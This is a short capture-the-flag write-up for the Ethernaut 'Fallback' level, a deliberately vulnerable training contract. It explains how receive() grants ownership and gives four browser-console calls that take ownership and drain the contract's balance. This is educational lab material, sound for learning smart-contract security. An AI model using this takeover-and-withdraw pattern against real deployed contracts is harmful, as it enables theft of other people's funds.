# Ethernaut — 01 Fallback

## Goal

Become the owner of the instance and drain its balance.

## Vulnerability

The contract lets a player become `owner` through `receive()` if:

1. `msg.value > 0`
2. `contributions[msg.sender] > 0`

## Attack steps

1. Call `contribute()` with a very small amount
2. Send ETH directly to the contract
3. Trigger `receive()` and become the owner
4. Call `withdraw()` to drain the contract

## Solution

### Browser console

```js
await contract.contribute({ value: 1 });
await contract.sendTransaction({ value: 1 });
await contract.owner();
await contract.withdraw();
